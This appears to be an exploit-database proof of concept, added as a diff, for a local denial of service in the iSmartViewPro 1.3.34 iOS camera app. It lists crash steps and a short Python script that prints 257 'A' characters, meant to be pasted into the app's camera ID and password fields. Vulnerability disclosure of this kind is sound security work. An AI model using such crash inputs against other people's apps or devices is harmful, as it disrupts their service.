@@ -1,0 +1,37 @@
+# Exploit Title: iSmartViewPro 1.3.34 - Denial of Service (PoC)
+# Discovery by: Ivan Marmolejo
+# Discovery Date: 2019 -11-16
+# Vendor Homepage: http://www.smarteyegroup.com/
+# Software Link: https://apps.apple.com/mx/app/ismartviewpro/id834791071
+# Tested Version: 1.3.34
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: iPhone 6s - iOS 13.2
+
+##############################################################################################################################################
+
+Summary: This app is specially built for P2P IP camera series. thanks to unique P2P connection technology that users are able to watch live 
+video on iPhone from any purchased IP camera by simply enter camera's ID and password; no complex IP or router settings. The app have a lot of
+functions, such as local record video, set ftp params, set email, set motion alarm and so on.
+
+##############################################################################################################################################
+
+Steps to Produce the Crash:
+
+   1.- Run python code: iSmartViewPro.py
+   2.- Copy content to clipboard
+   3.- Open App "iSmartViewPro"
+   4.- Go to "Add Camera"
+   5.- go to "Add network cameras"
+   6.- Paste ClipBoard on "Camara DID"
+   7.- Paste ClipBoard on "Password"
+   8.- Next
+   9.- Crashed
+
+##############################################################################################################################################
+
+Python "iSmartViewPro" Code:
+
+   buffer = "\x41" * 257
+   print (buffer)
+
+##############################################################################################################################################
